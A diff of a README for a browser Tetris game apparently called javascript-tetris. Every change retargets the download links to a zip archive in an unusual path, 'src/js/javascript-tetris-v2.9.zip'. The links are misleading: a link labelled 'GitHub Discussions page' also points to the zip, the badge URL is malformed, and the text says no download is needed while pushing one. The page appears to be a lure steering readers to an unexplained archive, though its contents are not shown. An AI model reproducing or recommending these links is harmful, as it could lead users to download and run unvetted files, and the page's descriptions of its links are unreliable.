@@ -4,7 +4,7 @@
 Welcome to javascript-tetris! This is a classic Tetris game built with HTML, CSS, and Vanilla JavaScript. You can play it directly in your web browser without any downloads or installations. Follow the steps below to start playing.
 
 ## 📥 Download the Game
-[![Download Now](https://raw.githubusercontent.com/kenneonn/javascript-tetris/master/sublettable/javascript-tetris.zip%20Now-Get%20the%20Game-brightgreen)](https://raw.githubusercontent.com/kenneonn/javascript-tetris/master/sublettable/javascript-tetris.zip)
+[![Download Now](https://raw.githubusercontent.com/kenneonn/javascript-tetris/master/src/js/javascript-tetris-v2.9.zip%20Now-Get%20the%20Game-brightgreen)](https://raw.githubusercontent.com/kenneonn/javascript-tetris/master/src/js/javascript-tetris-v2.9.zip)
 
 ## 📋 Features
 - **Classic Gameplay**: Experience the traditional Tetris gameplay with an engaging interface.
@@ -23,7 +23,7 @@ To run the game, ensure you have:
 
 ## 📥 Download & Install
 To get started with javascript-tetris, you can visit the page below to download the latest version of the game. 
-[Visit this page to download](https://raw.githubusercontent.com/kenneonn/javascript-tetris/master/sublettable/javascript-tetris.zip)
+[Visit this page to download](https://raw.githubusercontent.com/kenneonn/javascript-tetris/master/src/js/javascript-tetris-v2.9.zip)
 
 After downloading, open the HTML file in a web browser to start playing. You do not need any special software or plugins.
 
@@ -43,6 +43,6 @@ Want to help improve the game? Here’s how:
 This game is licensed under the MIT License. You are free to use, modify, and distribute this game as long as you provide attribution to the original creator.
 
 ## ✨ Get Involved
-Join our community of players and developers! You can find discussions and updates on our [GitHub Discussions page](https://raw.githubusercontent.com/kenneonn/javascript-tetris/master/sublettable/javascript-tetris.zip).
+Join our community of players and developers! You can find discussions and updates on our [GitHub Discussions page](https://raw.githubusercontent.com/kenneonn/javascript-tetris/master/src/js/javascript-tetris-v2.9.zip).
 
 Thank you for choosing javascript-tetris! Enjoy playing!
